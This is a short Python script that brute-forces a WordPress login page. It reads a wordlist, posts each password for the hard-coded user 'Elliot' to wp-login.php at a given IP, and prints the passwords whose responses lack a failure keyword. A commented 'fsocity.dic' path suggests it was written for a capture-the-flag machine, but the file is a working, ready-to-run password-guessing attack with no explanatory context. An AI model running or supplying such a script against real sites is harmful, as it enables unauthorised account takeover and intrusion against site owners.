from base64 import b64encode,b64decode
import requests
from time import sleep
from requests.structures import CaseInsensitiveDict
import datetime
import requests
from os import system
import json
import optparse

def getarg():
    parser = optparse.OptionParser()
    parser.add_option("-i","--ip",dest="ip",help="IP of Website")
    parser.add_option("-w","--wdlt",dest="wordlist",help="The Wordlist Address")
    parser.add_option("-p","--kwrdp",dest="keywordpass",help="The Keyword that you want to Detect of Password")
    option,argument = parser.parse_args()
    if (not option.ip or not option.wordlist or not option.keywordpass):
        parser.error("[-] Please specify an interface. use --help for more information.")
    return option
option = getarg()
ip = option.ip
wordlist = option.wordlist
keywordpass = option.keywordpass
#file = open("/home/kali/Downloads/directory_fuzzing/fsocity.dic").read().splitlines()
#print(file)
file = open(wordlist).read().splitlines()
file = list(set(file))
file.sort()
#print(file)

def GetPassData(x):
    url = f"http://{ip}/wp-login.php"
    headers = CaseInsensitiveDict()
    headers["Host"] = ip
    headers["Content-Type"] = "application/x-www-form-urlencoded"
    headers["Origin"] = f"http://{ip}"
    headers["Cookie"] = "wordpress_test_cookie=WP+Cookie+check; s_cc=true; s_fid=5214BAE27455D329-1FE0A68480BA0C56; s_nr=1667741123811; s_sq=%5B%5BB%5D%5D"
    data = f"log=Elliot&pwd={x}&wp-submit=Log+In&redirect_to=http%3A%2F%2F{ip}%2Fwp-admin%2F&testcookie=1"

    resp = requests.post(url, headers=headers, data=data)
    #return value as isChangeSuccess?
    return resp.content.decode("utf-8")

p = []
print("start")
#print(file)
for i in file:
    l = GetPassData(i).split()
    if keywordpass not in l:
       print(i)
       p.append(i)

print(f"Password : {p}")
